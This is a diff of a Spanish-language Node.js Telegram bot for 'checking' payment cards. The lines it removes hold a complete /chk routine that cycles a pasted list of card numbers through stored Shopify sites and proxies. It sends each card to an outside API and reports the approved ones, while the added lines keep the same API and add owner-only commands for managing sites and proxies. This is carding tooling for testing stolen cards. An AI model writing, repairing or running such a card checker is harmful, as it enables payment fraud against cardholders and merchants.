@@ -3,254 +3,173 @@ const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const fs = require('fs');
 
-// =====================
-// CONFIG
-// =====================
-const TOKEN = process.env.BOT_TOKEN;
-const OWNER_ID = 8220432777;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const OWNER_ID = Number(process.env.OWNER_ID);
 const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
-const DATA_FILE = './data.json';
 
-if (!TOKEN) {
+if (!BOT_TOKEN) {
   console.error('❌ BOT_TOKEN no definido');
   process.exit(1);
 }
 
-// =====================
-// STORAGE
-// =====================
-let DB = { users: {} };
-if (fs.existsSync(DATA_FILE)) {
-  DB = JSON.parse(fs.readFileSync(DATA_FILE));
-}
-function saveDB() {
-  fs.writeFileSync(DATA_FILE, JSON.stringify(DB, null, 2));
-}
-
-function getUser(chatId) {
-  if (!DB.users[chatId]) {
-    DB.users[chatId] = {
-      sites: [],
-      proxies: [],
-      running: false,
-      stop: false,
-      delay: 2000
-    };
-    saveDB();
+/* =====================================================
+   🔥 RESET AUTOMÁTICO TELEGRAM (ANTI 409 CONFLICT)
+   Esto limpia sesiones viejas de polling al arrancar
+   ===================================================== */
+(async () => {
+  try {
+    const resetBot = new TelegramBot(BOT_TOKEN);
+    await resetBot.deleteWebhook({ drop_pending_updates: true });
+    console.log('✅ Telegram polling reset OK');
+  } catch (e) {
+    console.error('⚠️ Error reseteando Telegram:', e.message);
   }
-  return DB.users[chatId];
-}
+})();
 
-// =====================
-// BOT
-// =====================
-const bot = new TelegramBot(TOKEN, {
-  polling: { interval: 300, autoStart: true }
+/* =====================================================
+   BOT PRINCIPAL
+   ===================================================== */
+const bot = new TelegramBot(BOT_TOKEN, {
+  polling: {
+    interval: 300,
+    autoStart: true
+  }
 });
 
-// =====================
-// START
-// =====================
+/* =====================================================
+   DATA
+   ===================================================== */
+const DATA_FILE = './data.json';
+let data = { sites: [], proxies: [] };
+
+if (fs.existsSync(DATA_FILE)) {
+  data = JSON.parse(fs.readFileSync(DATA_FILE));
+} else {
+  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+}
+
+function saveData() {
+  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+}
+
+function isOwner(id) {
+  return id === OWNER_ID;
+}
+
+/* =====================================================
+   START
+   ===================================================== */
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
-`🤖 Bot activo
+`🤖 Bot activo (versión nueva)
+
+Sites: ${data.sites.length}
+Proxies: ${data.proxies.length}
 
 Comandos:
-• /setsite <url>
 • /addsites
-• /setproxy <proxy>
+• /listsites
+• /delsite <n>
+• /clearsites
+
 • /addproxies
+• /listproxies
+• /delproxy <n>
+• /clearproxies
+
 • /chk <datos>
-• /stop
-
-ℹ️ Solo APPROVED se envían al chat`
+• /stop`
   );
 });
 
-// =====================
-// SITES
-// =====================
-bot.onText(/\/setsite (.+)/, (msg, m) => {
-  const u = getUser(msg.chat.id);
-  u.sites = [m[1].trim()];
-  saveDB();
-  bot.sendMessage(msg.chat.id, '✅ Site guardado');
-});
+/* =====================================================
+   SITES
+   ===================================================== */
+bot.onText(/\/addsites/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  bot.sendMessage(msg.chat.id, '📥 Envía los sites (uno por línea):');
 
-bot.onText(/\/addsites([\s\S]*)/, (msg, m) => {
-  const u = getUser(msg.chat.id);
-  const text = (m[1] || '').trim();
-
-  if (!text) {
-    return bot.sendMessage(
-      msg.chat.id,
-      '❌ Ejemplo:\n/addsites\nhttps://site1.com\nhttps://site2.com'
-    );
-  }
-
-  const sites = text
-    .split('\n')
-    .map(s => s.trim())
-    .filter(s => s.startsWith('http'));
-
-  sites.forEach(s => {
-    if (!u.sites.includes(s)) u.sites.push(s);
+  bot.once('message', (m) => {
+    const lines = m.text.split('\n').map(x => x.trim()).filter(Boolean);
+    data.sites.push(...lines);
+    saveData();
+    bot.sendMessage(msg.chat.id, `✅ ${lines.length} sites agregados`);
   });
-
-  saveDB();
-  bot.sendMessage(msg.chat.id, `✅ Sites agregados: ${sites.length}`);
 });
 
-// =====================
-// PROXIES (FIXED)
-// =====================
-bot.onText(/\/setproxy (.+)/, (msg, m) => {
-  const u = getUser(msg.chat.id);
-  u.proxies = [m[1].trim()];
-  saveDB();
-  bot.sendMessage(msg.chat.id, '✅ Proxy guardado');
+bot.onText(/\/listsites/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  if (!data.sites.length) {
+    return bot.sendMessage(msg.chat.id, '❌ No hay sites guardados');
+  }
+  const list = data.sites.map((s, i) => `${i + 1}. ${s}`).join('\n');
+  bot.sendMessage(msg.chat.id, `🌐 Sites:\n\n${list}`);
 });
 
-bot.onText(/\/addproxies([\s\S]*)/, (msg, m) => {
-  const u = getUser(msg.chat.id);
-  const text = (m[1] || '').trim();
+bot.onText(/\/delsite (\d+)/, (msg, match) => {
+  if (!isOwner(msg.from.id)) return;
+  const i = parseInt(match[1]) - 1;
+  if (!data.sites[i]) return bot.sendMessage(msg.chat.id, '❌ Site inválido');
 
-  if (!text) {
-    return bot.sendMessage(
-      msg.chat.id,
-      '❌ Ejemplo:\n/addproxies\nip:port:user:pass\nip:port:user:pass'
-    );
-  }
+  const removed = data.sites.splice(i, 1);
+  saveData();
+  bot.sendMessage(msg.chat.id, `🗑 Site eliminado:\n${removed[0]}`);
+});
 
-  const proxies = text
-    .split('\n')
-    .map(p => p.trim())
-    .filter(p => p.includes(':'));
+bot.onText(/\/clearsites/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  data.sites = [];
+  saveData();
+  bot.sendMessage(msg.chat.id, '🧹 Todos los sites eliminados');
+});
 
-  if (!proxies.length) {
-    return bot.sendMessage(msg.chat.id, '❌ No se detectaron proxies válidos');
-  }
+/* =====================================================
+   PROXIES
+   ===================================================== */
+bot.onText(/\/addproxies/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  bot.sendMessage(msg.chat.id, '📥 Envía los proxies (uno por línea):');
 
-  proxies.forEach(p => {
-    if (!u.proxies.includes(p)) u.proxies.push(p);
+  bot.once('message', (m) => {
+    const lines = m.text.split('\n').map(x => x.trim()).filter(Boolean);
+    data.proxies.push(...lines);
+    saveData();
+    bot.sendMessage(msg.chat.id, `✅ ${lines.length} proxies agregados`);
   });
-
-  saveDB();
-  bot.sendMessage(
-    msg.chat.id,
-    `✅ Proxies agregados: ${proxies.length}\n🧰 Total: ${u.proxies.length}`
-  );
 });
 
-// =====================
-// STOP
-// =====================
+bot.onText(/\/listproxies/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  if (!data.proxies.length) {
+    return bot.sendMessage(msg.chat.id, '❌ No hay proxies guardados');
+  }
+  const list = data.proxies.map((p, i) => `${i + 1}. ${p}`).join('\n');
+  bot.sendMessage(msg.chat.id, `🧰 Proxies:\n\n${list}`);
+});
+
+bot.onText(/\/delproxy (\d+)/, (msg, match) => {
+  if (!isOwner(msg.from.id)) return;
+  const i = parseInt(match[1]) - 1;
+  if (!data.proxies[i]) return bot.sendMessage(msg.chat.id, '❌ Proxy inválido');
+
+  const removed = data.proxies.splice(i, 1);
+  saveData();
+  bot.sendMessage(msg.chat.id, `🗑 Proxy eliminado:\n${removed[0]}`);
+});
+
+bot.onText(/\/clearproxies/, (msg) => {
+  if (!isOwner(msg.from.id)) return;
+  data.proxies = [];
+  saveData();
+  bot.sendMessage(msg.chat.id, '🧹 Todos los proxies eliminados');
+});
+
+/* =====================================================
+   STOP
+   ===================================================== */
 bot.onText(/\/stop/, (msg) => {
-  const u = getUser(msg.chat.id);
-  u.stop = true;
   bot.sendMessage(msg.chat.id, '🛑 Proceso detenido');
 });
 
-// =====================
-// CHK CON PROGRESO
-// =====================
-bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const input = (match[1] || '').trim();
-  const u = getUser(chatId);
-
-  if (u.running) {
-    return bot.sendMessage(chatId, '⚠️ Ya hay un CHK en proceso');
-  }
-
-  if (!input) {
-    return bot.sendMessage(chatId, '❌ Envía datos después de /chk');
-  }
-
-  if (!u.sites.length || !u.proxies.length) {
-    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
-  }
-
-  const list = input.split('\n').map(x => x.trim()).filter(Boolean);
-  const total = list.length;
-
-  let done = 0;
-  let approved = 0;
-  let failed = 0;
-
-  const startTime = Date.now();
-  u.running = true;
-  u.stop = false;
-
-  // Mensaje único de progreso
-  const progressMsg = await bot.sendMessage(
-    chatId,
-`▱▱▱▱▱▱▱▱▱▱ 0% 0/${total}
-
-⏱ 0:00 • ETA --:--
-💳 ✅ 0 • ❌ 0`
-  );
-
-  for (let i = 0; i < total; i++) {
-    if (u.stop) break;
-
-    const cc = list[i];
-    const site = u.sites[i % u.sites.length];
-    const proxy = u.proxies[i % u.proxies.length];
-
-    try {
-      const res = await axios.get(API_BASE, {
-        params: { site, cc, proxy },
-        timeout: 30000
-      });
-
-      const d = res.data;
-      done++;
-
-      if (String(d.Response || '').toUpperCase().includes('APPROVED')) {
-        approved++;
-        await bot.sendMessage(
-          chatId,
-`━━━━━━━━━━━━━━
-🟢 *APPROVED*
-💳 ${cc}
-🌐 ${site}
-📤 ${d.Response}`,
-          { parse_mode: 'Markdown' }
-        );
-      } else {
-        failed++;
-      }
-
-    } catch (e) {
-      done++;
-      failed++;
-    }
-
-    const percent = Math.floor((done / total) * 100);
-    const filled = Math.floor(percent / 10);
-    const bar = '▰'.repeat(filled) + '▱'.repeat(10 - filled);
-
-    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-    const speed = done ? (done / (elapsed / 60 || 1)) : 0;
-    const eta = speed ? Math.floor(((total - done) / speed) * 60) : 0;
-
-    await bot.editMessageText(
-`${bar} ${percent}% ${done}/${total}
-
-⏱ ${Math.floor(elapsed / 60)}:${String(elapsed % 60).padStart(2,'0')}
-ETA ${Math.floor(eta / 60)}:${String(eta % 60).padStart(2,'0')}
-💳 ✅ ${approved} • ❌ ${failed}`,
-      {
-        chat_id: chatId,
-        message_id: progressMsg.message_id
-      }
-    );
-
-    await new Promise(r => setTimeout(r, u.delay));
-  }
-
-  u.running = false;
-  saveDB();
-});
+console.log('🤖 Bot iniciado correctamente');
